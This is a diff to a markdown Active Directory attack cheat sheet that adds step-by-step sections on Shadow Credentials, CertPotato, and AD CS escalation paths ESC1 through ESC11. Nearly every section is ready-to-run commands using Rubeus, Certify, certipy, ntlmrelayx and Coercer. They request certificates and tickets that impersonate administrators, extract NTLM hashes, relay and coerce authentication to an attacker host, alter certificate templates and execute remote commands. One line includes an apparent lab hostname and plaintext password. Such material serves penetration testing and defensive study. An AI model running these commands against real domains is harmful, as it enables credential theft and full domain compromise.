@@ -585,10 +585,72 @@ Get-DomainObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.Security
 #### GenericWrite - Computer object takeover
 See [Computer object takeover](#Computer-object-Takeover) 
 
-#### Writedacl - Read LAPS password
+#### GenericAll - Read LAPS password
 ```
 Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All -Verbose
 Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd
+```
+
+### GenericWrite - Shadow Credentials
+- Write Key Credentials to the `msDS-KeyCredentialLink` attribute. Request TGT and Extract NTLM hash.
+- Possible to use for persistence since password change doesn't affect the attribute
+
+### Windows
+#### Add shadow credentials
+- https://github.com/eladshamir/Whisker
+```
+.\Whisker.exe add /target:<TARGET OBJECT> /domain:<FQDN DOMAIN> /dc:<FQDN DC> /path:'shadow.pfx' /password:<PASSWORD>
+```
+
+#### List credential object
+```
+.\Whisker.exe list /target:<TARGET OBJECT> /domain:<FQDN DOMAIN> /dc:<FQDN DC>
+```
+
+#### Run the printed Rubeus command and retrieve NTLM hash
+```
+Rubeus.exe asktgt /user:.... /certificate:..... /....
+```
+
+#### Perform S4USelf attack to gain TGS ticket
+- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM
+- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right.
+- Make sure they are local admin on the target machine.
+```
+.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/<FQDN COMPUTER> /dc:<FQDN DC> /ticket:<TICKET BASE64> /ptt
+```
+
+- Or use the NTLM (Not opsec safe)
+
+```
+.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/<FQDN COMPUTER> /dc:<FQDN DC> /user:'<COMPUTERACCOUNT>$' /rc4:<NTLM> /ptt
+
+.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:http/<FQDN COMPUTER> /dc:<FQDN DC> /user:'<COMPUTERACCOUNT>$' /rc4:<NTLM> /ptt
+```
+
+#### Check access
+```
+dir \\<TARGET FQDN>\c$
+winrs -r:<TARGET FQDN> whoami
+```
+
+#### Cleanup
+```
+.\Whisker.exe remove /target:<TARGET OBJECT> /domain:<FQDN DOMAIN> /dc:<FQDN DC> /deviceid:<DEVICE ID>
+```
+
+### Linux
+- Possible to use python version of whisker https://github.com/ShutdownRepo/pywhisker
+#### Add shadow credentials and retrieve NTLM & .ccache
+```
+certipy shadow auto -k -no-pass -dc-ip <DC IP> -account <SAMACCOUNTNAME OBJECT> -target <FQDN DC> -debug
+```
+
+#### Add shadow credentials Relay
+```
+ntlmrelayx.py -t ldap://<FQDN DC> --shadow-credentials --shadow-target '<SAMACCOUNTNAME OBJECT>'
+
+python3 Coercer.py coerce -l cb-ws.certbulk.cb.corp -t cb-store.certbulk.cb.corp -u studentx -p 'IamtheF!rstStud3nt#' -d certbulk.cb.corp -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
 ```
 
 ### Permissions on Domain Object
@@ -1542,121 +1604,568 @@ python3 aclpwn.py --restore aclpwn.restore
 - https://github.com/GhostPack/Certify
 - https://github.com/ly4k/Certipy
 
+### Enumeration
 #### Find AD CS Certificate authorities (CA's)
 ```
-.\Certify.exe cas
+Get-ADObject -Filter * -SearchBase 'CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<DOMAIN>'
 
 Get-DomainGroupMember "Cert Publishers"
+
+.\Certify.exe cas
+
+certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -stdout
 ```
 
-#### Get enabled templates
+#### List all templates
 ```
-certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -stdout -enabled
+.\Certify.exe find
+
+certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -stdout
 ```
 
-#### Enumerate vulnerabilities
-```
+#### Enumerate vulnerable templates
+- This checks also for `Object Control`, if you have multiple users then don't run `/vulnerable` but check manually!
+ ```
+.\Certify.exe find /vulnerable
+
 certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -old-bloodhound
 certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -vulnerable -stdout
-
-.\Certify.exe find /vulnerable
 ```
 
-### Misconfigured Certificate Templates
-- AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation.
+### Local privesc CertPotato
+- Requirements
+	- ADCS configured & Machine template
+	- Access to Virtual or network service account
 
-#### Find misconfigured certificate templates
-- Prerequisite: ```Client Authentication``` set and who has ```Enrollment Rights``` and if ```Authorization Signatures Required``` is disabled.
-- If a object owned has `WriteOwner`, `WriteDacl` or `WriteProperty`, then this could also be abused.
-- This configuration allows any domain user to request a certificate for any other domain user (including a domain admin), and use it to authenticate to the domain
+### Windows
+#### Get TGT on target machine
 ```
-.\Certify.exe find /vulnerable
+.\Rubeus.exe tgtdeleg /nowrap
 ```
 
-#### Request certificate for a user
-- For example domain admin
+#### Inject ticket
 ```
-.\Certify.exe request /ca:<CA NAME> /template:<TEMPLATE> /altname:<USERNAME>
+.\Rubeus ptt /ticket:<BASE64 TICKET>
 ```
-- Save cert + key in a cert.pem file
 
-#### Transform cert to pfx
-- Set a password, `password`
+#### Check for machine template
+- Check for `pkiextendedkeyusage` set to `Client Authentication`
+```
+.\Certify.exe find
+```
+
+#### Request template using machine template
+```
+.\Certify.exe request /ca:<CA SERVER>\<CA NAME> /user:<COMPUTERACCOUNT>$ /domain:<FQDN DOMAIN> /template:<TEMPLATE NAME>
+```
+
+#### Convert Pem to PFX with openssl
+- Save the private key and cert to `cert.pem`
 ```
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
 
-#### Rubeus ask TGT using the certificate
+#### Unpack the hash attack
 ```
-cat cert.pfx | base64 -w 0
-.\Rubeus.exe asktgt /user:<USERNAME> /certificate:<BASE64 CERT> /password:password /aes256 /nowrap
-```
-
-#### Write TGT kirbi
-```
-[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
-```
- 
-#### Then load TGT and request TGS or access systems as this user.
-
-### Relaying to ADCS HTTP Endpoints
-- ADCS services supports HTTP enrolment and has a GUI. Endpoint: `http[s]://<hostname>/certsrv` and by default supports NTLM and Negotiate authentication methods.
-- If NTLM authentication is enabled, these endpoints are vulnerable to NTLM relay attacks. A abuse method is to relay authentication of a machine to the CA to obtain a certificate and request a TGT.
-- The certificate template used needs to be configured for authentication (i.e. EKUs like Client Authentication, PKINIT Client Authentication, Smart Card Logon, Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA)) and allowing low-priv users to enroll can be abused to authenticate as any other user/machine/admin.
-- The default User and Machine/Computer templates match those criteria and are very often enabled.
-
-#### Find Vulnerable ESC8 CA's
-```
-certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -vulnerable -stdout | grep -B20 ESC8
-
-certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -stdout -enabled
+.\Rubeus.exe asktgt /getcredentials /user:<COMPUTERACCOUNT>$ /certificate:<PATH TO PFX> /password:<PASSWORD OF PFX> /domain:<FQDN DOMAIN> /dc:<FQDN DC> /show
 ```
 
-#### Start ntlmrelayx.py
+#### Perform S4USelf attack to gain TGS ticket
+- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM
+- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right.
+- Make sure they are local admin on the target machine.
 ```
-ntlmrelayx.py -t http://<IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
-```
- 
-#### Force authentication
-```
-.\SpoolSample.exe <IP> <IP>
-```
- 
-#### Ouput should give a TGT which can be used with S4U2self
-- LINK TO S4U2self
- 
-### Forged Certificates
-#### Dump the private keys
-- Execute on the CA server. You can generally tell this is the private CA key because the Issuer and Subject are both set to the distinguished name of the CA.
-- https://github.com/GhostPack/SharpDPAPI
-```
-.\SharpDPAPI.exe certificates /machine
-```
-- Save cert + key in a cert.pem file
+.\Rubeus.exe s4u /self /impersonateuser:<USER TO IMPERSONATE> /altservice:cifs/<FQDN COMPUTER> /dc:<FQDN DC> /user:<COMPUTERACCOUNT>$ /rc4:<NTLM> /ptt
 
-#### Transform cert to pfx
-- Set a password, password
+.\Rubeus.exe s4u /self /impersonateuser:<USER TO IMPERSONATE> /altservice:http/<FQDN COMPUTER> /dc:<FQDN DC> /user:<COMPUTERACCOUNT>$ /rc4:<NTLM> /ptt
+```
+
+#### Check access
+```
+dir \\<TARGET FQDN>\c$
+winrs -r:<TARGET FQDN> whoami
+```
+
+### Linux
+#### Get TGT on target machine
+```
+.\Rubeus.exe tgtdeleg /nowrap
+```
+
+#### Linux Convert ticket & Use
+```
+echo "<BASE64>" | base64 -d > ticket.kirbi
+python3 ticketConverter.py ticket.kirbi ticket.ccache
+export KRB5CCNAME=<PATH TO ticket.ccache>
+```
+
+#### Retrieve NTLM hash using shadow credentials
+```
+certipy shadow auto -k -no-pass -dc-ip <DC IP> -account cb-webapp1 -target <FQDN DC> -debug
+```
+
+#### Retrieve SID of domain
+```
+rpcclient -U '%' <FQDN DOMAIN> -c 'lsaquery'
+```
+
+#### Request TGS ticket
+- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
+- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right.
+- Make sure they are local admin on the target machine.
+```
+python3 ticketer.py -nthash <NTLM HASH> -domain <FQDN DOMAIN> -domain-sid <DOMAIN SID> -spn cifs/<FQDN COMPUTER ACCOUNT> Administrator
+
+export KRB5CCNAME=<PATH TO CCACHE>
+```
+
+#### Execute commands
+```
+python3 wmiexec.py -k -no-pass <FQDN COMPUTER ACCOUNT>
+```
+
+### Privilege Escaltion ESC
+### ESC1 Request SAN of other user
+- Requirements
+	- Extended Key Usage: `Smart Card Logon` (`1.3.6.1.4.1.311.20.2.2`), `PKINIT authentication` (`1.3.6.1.5.2.3.4`) or `Client Authentication` (`1.3.6.1.5.5.7.3.2`) for AD Authentication.
+	- Certificate-Name-Flag: `ENROLLEE_SUPPLIES_SUBJECT` attribute is enabled: allows the certificate requestor to specify any subjectAltName (SAN) to request a certificate as any user 
+	- User with Enrollment Rights
+- CBA patch breaks this attack if there is no match with the SID of the target user. Use `/sidextension` or `-extensionsid` to fix this.
+### Windows
+#### Get SID of user 
+```
+Get-DomainUser <SAMACCOUNTNAME> | Select-Object samaccountname, objectsid
+```
+
+#### Request cert and abuse SAN
+```
+.\Certify.exe request /ca:<FQDN CA>\<CA NAME> /template:<TEMPLATE NAME> /altname:<USER> /sidextension:<TARGET OBJECT SID> /domain:<FQDN>
+```
+
+#### Convert Pem to PFX with openssl
+- Save the private key and cert to `cert.pem`
 ```
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
 
-#### Create a forged certificate
+#### Request TGT
+- Add `/getcredentials` to also retrieve the NTLM hash
 ```
-.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@<DOMAIN>" --NewCertPath fake.pfx --NewCertPassword "password"
-```
-
-#### Create a TGT
-```
-cat cert.pfx | base64 -w 0
-.\Rubeus.exe asktgt /user:Administrator /domain:<DOMAIN> /certificate:<BASE64 CERT> /password:password /nowrap
+.\Rubeus.exe asktgt /user:<USER> /certificate:<PATH TO cert.pfx> /password:<PASSWORD> /domain:<FQDN DOMAIN> /dc:<FQDN DC> /nowrap /ptt
 ```
 
-#### Write TGT kirbi
+#### Check access
 ```
-[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
+dir \\<TARGET FQDN>\c$
+winrs -r:<TARGET FQDN> whoami
 ```
- 
-#### Then load TGT and request TGS or access systems as this user.
+
+### Linux
+#### Get SID of user 
+```
+pywerview get-netuser -u <USER> -p <PASSWORD --username <USER> --domain <FQDN DOMAIN> --dc-ip <DC IP> --attributes "objectsid"
+```
+
+#### Request cert and abuse SAN
+```
+certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -ca <CA NAME> -template <TEMPLATE NAME> -upn <SAMACCOUNTNAME>@<FQDN DOMAIN> -extensionsid <OBJECTSID> -out 'esc1' -debug
+```
+
+#### Unpac the hash
+```
+certipy auth -pfx 'esc1.pfx'
+```
+
+#### Check access
+```
+cme smb <FQDN> -u <USER> -H <NTLM HASH>
+```
+
+### ESC2 Modifiable SAN
+- Same as ESC1 only EKU is different. A certificate with no EKUs (SubCA certificate) can be abused for any purpose as well. It could also be used to sign new certificates.
+- Requirements
+	- Extended Key Usage: `Any Purpose` (`2.5.29.37.0`)
+	- Certificate-Name-Flag: `ENROLLEE_SUPPLIES_SUBJECT` attribute is enabled: allows the certificate requestor to specify any subjectAltName (SAN) to request a certificate as any user 
+	- User with Enrollment Rights
+
+#### Abuse same as ESC1 for Windows/Linux
+- [ESC1 Link](#ESC1 Request SAN of other user)
+
+### ESC3 Agent certificate & Enroll on behalf of other user
+- Requires two certficate templates
+	- Template 1
+		- Extended Key Usage: `Certificate Request Agent` (`1.3.6.1.4.1.311.20.2.1`)
+		- User with Enrollment Rights
+	- Template 2
+		- Extended Key Usage: `Client Authentication` (`1.3.6.1.5.5.7.3.2`)
+		- Authorized Signatures Required: `1`
+		- Application Policies: `Certificate Request Agent` (Doesn't show in certipy, Auth sig 1 is good)
+		- User with Enrollment Rights
+
+### Windows
+#### Request Enrollment Agent Certificate
+- Template 1
+```
+.\Certify.exe request /ca:<FQDN CA>\<CA NAME> /template:<TEMPLATE NAME 1> /user:<USER TO ENROLL> /domain:<DOMAIN>
+```
+
+#### Convert Pem to PFX with openssl
+- Save the private key and cert to `cert.pem`
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+#### Enroll agent on behalf of another user
+- Template 2
+
+```
+.\Certify.exe request /ca:<FQDN CA>\<CA NAME> /template:<TEMPLATE NAME 2> /onbehalfof:<DOMAIN>\<USER> /enrollcert:<PATH TO cert.pfx> /enrollcertpw:<PASSWORD> /domain:<DOMAIN>
+```
+
+#### Convert Pem to PFX with openssl
+- Save the private key and cert to `cert.pem`
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+#### Request TGT
+- Add `/getcredentials` to also retrieve the NTLM hash
+```
+.\Rubeus.exe asktgt /user:<USER> /certificate:<PATH TO cert.pfx> /password:<PASSWORD> /domain:<FQDN DOMAIN> /dc:<FQDN DC> /nowrap /ptt
+```
+
+#### Check access
+```
+dir \\<TARGET FQDN>\c$
+winrs -r:<TARGET FQDN> whoami
+```
+
+### Linux
+#### Request Enrollment Agent Certificate
+- Template 1
+```
+.\Certify.exe request /ca:<FQDN CA>\<CA NAME> /template:<TEMPLATE NAME> /user:<USER TO ENROLL> /domain:<DOMAIN>
+
+certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -ca <CA NAME> -template <TEMPLATE NAME> -upn <SAMACCOUNTNAME>@<FQDN DOMAIN> -out 'esc3' -debug -EnrollmentAgent-certipy
+```
+
+#### Enroll agent on behalf of another user
+- Template 2
+- Use the original certipy without `/extensionsid`
+```
+certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -ca <CA NAME> -template <TEMPLATE NAME> --on-behalf-of <DOMAIN>\<USER> -pfx '<PATH TO esc3.pfx>' -out 'esc3_admin' -timeout 30 -debug
+```
+
+#### Unpac the hash
+```
+certipy auth -pfx 'esc1.pfx'
+```
+
+#### Check access
+```
+cme smb <FQDN> -u <USER> -H <NTLM HASH>
+```
+
+### ESC4 Template ACEs
+- Abuse ACL's on the template and then abuse ESC1, ESC2 or ESC3
+- Requirements
+	- User with  `Object Control Permissions` ACL `Owner`, `FullControl`, `WriteOwner`, `WriteDacl` or `WriteProperty`
+
+### Windows
+#### Enumerate ACLs for users
+```
+.\Certify.exe pkiobjects
+```
+
+#### Enumerate templates and ACL's
+- Shows `Object Control Permissions`
+```
+Certify.exe find /showAllPermissions
+```
+
+#### Enumerate ACLs specific template
+- https://github.com/FuzzySecurity/StandIn
+```
+.\StandIn_v13_Net45.exe --ADCS --filter <TEMPLATE NAME>
+```
+
+### Configure ESC1 client authentication
+#### Add ENROLEE_SUPPLIES_SUBJECT
+```
+.\StandIn_v13_Net45.exe --ADCS --filter <TEMPLATE NAME> --ess --add
+```
+
+#### Add Enrollment
+```
+.\StandIn_v13_Net45.exe --ADCS --filter <TEMPLATE NAME> --ntaccount "<DOMAIN>\<USERS>" --enroll --add
+```
+
+#### Add client authentication EKU
+```
+.\StandIn_v13_Net45.exe --ADCS --filter <TEMPLATE NAME> --clientauth --add
+```
+
+#### Abuse same as ESC1 for Windows/Linux
+- [ESC1 Link](#ESC1-Request-SAN-of-other-user)
+
+#### Cleanup
+```
+## Remove Enrollment rights for cb\certstore
+C:\ADCS\Tools> C:\ADCS\Tools\StandIn\StandIn_v13_Net45.exe --adcs --filter <TEMPLATE NAME> --ntaccount <DOMAIN>\<USER> --enroll --remove
+
+## Remove ENROLLEE_SUPPLIES_SUBJECT
+C:\ADCS\Tools> C:\ADCS\Tools\StandIn\StandIn_v13_Net45.exe --adcs --filter <TEMPLATE NAME> --ess --remove
+```
+
+#### Configure SmartCardLogon and request certs
+-  `/alter` module alters the target template with SmartCardLogon and requests a new certificate for an alternate name and restores the template
+```
+.\CertifyKit.exe request /ca:<FQDC CA>\<CA NAME> /template:<TEMPLATE NAME> /altname:<USER> /domain:<FQDN DOMAIN> /alter /sidextension:<TARGET OBJECT SID>
+```
+
+### Linux
+#### Enumerate ACLs
+```
+certipy find -u <USER> -p <PASSWORD> -stdout
+```
+
+### Configure ESC1
+- Possible to use https://github.com/fortalice/modifyCertTemplate for more controls
+#### Save template
+```
+certipy template -u <USER>@<FQDN> -hashes <NTLM HASH> -template <TEMPLATE NAME> -save-old
+```
+
+#### Get domain user SID
+```
+pywerview get-netuser -u <USER> -p <PASSWORD --username <USER> --domain <FQDN DOMAIN> --dc-ip <DC IP> --attributes "objectsid"
+```
+
+#### Abuse ESC4
+```
+certipy req -u <USER> -hashes <NTLM HASH> -ca <CA NAME> -target <FQDN CA> -template <TEMPLATE NAME> -upn <USER>@<FQDN DOMAIN> -extensionsid <USER SID> -out 'esc4-certipy' -debug
+```
+
+#### Restore template
+```
+certipy template -u <USER> -hashes <NTLM HASH> -template <TEMPLATE NAME> -configuration '<JSON>.json'
+```
+
+### ESC5 Vulnerable PKI Object ACEs
+- Such as AD CS computer object or Containers
+	- Compromising the CA's server's computer object using RBCD or Shadow Credentials
+	- ACLs misconfigured to a descendant AD object (Certificate template, Certificate Authorities container, the NTAuthCertificates subject)
+
+#### RBCD or Shadow Credentials
+- [RBCD](#Computer-object-takeover)
+- [Shadow Credentials](#GenericWrite-Shadow-Credentials)
+
+### ESC7 Vulnerable CA ACL
+- A low privilege user is granted the ManageCA (CA Administrator) and ManageCertificates (Certificate Manager) rights over the CA.
+- Bypass CBA patch in full enforcement mode:
+	- ESC 7.1 Abusing SubCA template to approve a failed request using ManageCertificates rights: https://www.tarlogic.com/blog/ad-cs-esc7-attack
+	- ESC 7.2  Abusing CRL Distribution Points (CDPs) and using them to deploy SYSTEM webshells to CA servers respectively: https://www.tarlogic.com/blog/ad-cs-manageca-rce/
+
+### ESC7.1 Failed request
+- Requirements:
+	- User with `Allow ManageCA and ManageCertificates`
+	- `SubCA` template enabled (or enable it). Should be enabled by default but only Domain Admins or Enterprise Admins can enroll by default!
+
+### Windows
+#### Check CA for user with permissions
+```
+.\Certify.exe cas
+```
+
+#### Check if SubCA is enabled
+```
+.\Certify.exe find
+```
+
+#### Get SID of user 
+```
+Get-DomainUser <SAMACCOUNTNAME> | Select-Object samaccountname, objectsid
+```
+
+#### Create failed request
+```
+.\Certify.exe request /ca:<FQDN CA>\<CA NAME> /template:<TEMPLATE> /altname:<USER> /domain:<DOMAIN> /sidextension:<TARGET OBJECT SID>
+```
+
+#### Save private key
+```
+notepad esc7.pem
+```
+
+#### Approve failed certificate
+- https://github.com/blackarrowsec/Certify
+	- This fork of Certify requires RSAT ADDS tools installed.
+- Requires `ManageCA` and `ManageCertificates` permissions
+```
+.\Certify-esc7.exe issue /ca:<FQDN CA>\<CA NAME> /id:<REQUEST ID>
+```
+
+#### Download approved request
+```
+.\Certify-esc7.exe download /ca:<FQDN CA>\<CA NAME> /id:<REQUEST ID>
+```
+
+#### Append certificate
+```
+notepad esc7.pem
+```
+
+#### Convert Pem to PFX with openssl
+- Save the private key and cert to `cert.pem`
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+#### Request TGT
+- Add `/getcredentials` to also retrieve the NTLM hash
+```
+.\Rubeus.exe asktgt /user:<USER> /certificate:<PATH TO cert.pfx> /password:<PASSWORD> /domain:<FQDN DOMAIN> /dc:<FQDN DC> /nowrap /ptt
+```
+
+#### Check access
+```
+dir \\<TARGET FQDN>\c$
+winrs -r:<TARGET FQDN> whoami
+```
+
+#### Give ManageCertificates rights
+- Only run if required
+```
+certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -ca <CA NAME> -template <TEMPLATE NAME> -add-officer <TARGET USER>
+```
+
+#### Enable SubCA template
+- Only run if required
+- Requires ManageCertificates rights
+```
+certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -enable-template 'SubCA'
+```
+
+### Linux
+#### Get SID of user 
+```
+pywerview get-netuser -u <USER> -p <PASSWORD --username <USER> --domain <FQDN DOMAIN> --dc-ip <DC IP> --attributes "objectsid"
+```
+
+#### Request cert and abuse SAN
+```
+certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -ca <CA NAME> -template <TEMPLATE NAME> -upn <SAMACCOUNTNAME>@<FQDN DOMAIN> -extensionsid <OBJECTSID> -out 'esc7' -debug
+```
+
+#### Approve failed certificate
+- Requires `ManageCA` and `ManageCertificates` permissions
+```
+certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -ca <CA NAME> -issue-request <REQUEST ID> -debug
+```
+
+#### Download approved request
+```
+certipy req -u <USER>@<DOMAIN> -hashes <NTLM HASH> -dc-ip <DC IP> -target <FQDN CA> -ca <CA NAME> -retrieve <REQUEST ID> -out 'esc7' -debug
+```
+
+#### Append files
+```
+vim esc7.crt
+vim esc7.key
+```
+
+#### Convert Pem to PFX with openssl
+- Save the private key and cert to `cert.pem`
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+#### Unpac the hash
+```
+certipy auth -pfx 'esc7.pfx'
+```
+
+#### Check access
+```
+cme smb <FQDN> -u <USER> -H <NTLM HASH>
+```
+
+### ESC8 NTLM Relay to AD CS HTTP(S) Endpoints
+- Web enrollment interface (`http://<CA FQDN>/certsrv/certsnsh.asp`)
+- Target Default Machine Template or Domain Controller Authentication
+
+#### Enumerate HTTP Enrollment Endpoints
+```
+certipy find -u <USER>@<FQDN DOMAIN> -p <PASSWORD> -dc-ip <DC IP> -stdout
+```
+
+```
+certutil -enrollmentServerURL -config <CA NAME>
+```
+
+#### Start NTLMRelay
+```
+python3 ntlmrelayx.py -t http://<FQDN CA>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE NAME>
+```
+
+#### Force coerce
+```
+python3 Coercer.py coerce -l <KALI IP> -t <TARGET IP> -u <USER> -p <PASSWORD> -d <DOMAIN> -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
+```
+
+#### Request TGT
+```
+.\Rubeus.exe asktgt /user:<COMPUTER ACCOUNT>$ /domain:<FQDN DOMAIN> /dc:<FQDN DC> /outfile:esc8.kirbi /certificate:<BASE64 CERT>
+```
+
+#### Execute S4USelf
+```
+.\Rubeus.exe s4u /self /impersonateuser:<USER> /altservice:cifs/<FQDN COMPUTER> /dc:<FQDN DC> /user:<COMPUTER ACCOUNT>$ /ticket:esc8.kirbi /ptt
+```
+
+#### Check access
+```
+dir \\<TARGET FQDN>\c$
+winrs -r:<TARGET FQDN> whoami
+```
+
+### ESC11 NTLM Relay to AD CS ICPR Endpoints
+- Relay RPC interface which supports NTLM auth. ICertPassage Remote Protocol can be used to request certificates
+- If the `IF_ENFORCEENCRYPTICERTREQUEST` flag is set relaying using RPC will not be possible. Flag by default on Windows server 2012 and higher!
+
+#### Enumerate CES Enrollment Endpoints
+- Check for `Enforce Encryption for Requests : Disabled` on the Certificate Authorities (Not the template!)
+- Requires specific fork of certipy https://github.com/sploutchy/Certipy
+```
+certipy find -u <USER>@<FQDN DOMAIN> -p <PASSWORD> -dc-ip <DC IP> -stdout
+```
+
+#### Start NTLMRelay
+- Requires specific fork of impacket https://github.com/sploutchy/impacket
+```
+python3 ntlmrelayx.py -t rpc://<FQDN CA> -smb2support --adcs --template DomainControllerAuthentication -rpc-mode ICPR -icpr-ca-name "<CA NAME>"
+```
+
+#### Force coerce
+```
+python3 Coercer.py coerce -l <KALI IP> -t <TARGET IP> -u <USER> -p <PASSWORD> -d <DOMAIN> -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
+```
+
+#### Request TGT
+```
+.\Rubeus.exe asktgt /user:<COMPUTER ACCOUNT>$ /domain:<FQDN DOMAIN> /dc:<FQDN DC> /outfile:esc11.kirbi /certificate:<BASE64 CERT>
+```
+
+#### Execute S4USelf
+```
+.\Rubeus.exe s4u /self /impersonateuser:<USER> /altservice:cifs/<FQDN COMPUTER> /dc:<FQDN DC> /user:<COMPUTER ACCOUNT>$ /ticket:esc8.kirbi /ptt
+```
+
+#### Check access
+```
+dir \\<TARGET FQDN>\c$
+winrs -r:<TARGET FQDN> whoami
+```
 
 ## SQL Server
 - Could be possible cross domain or cross forest!
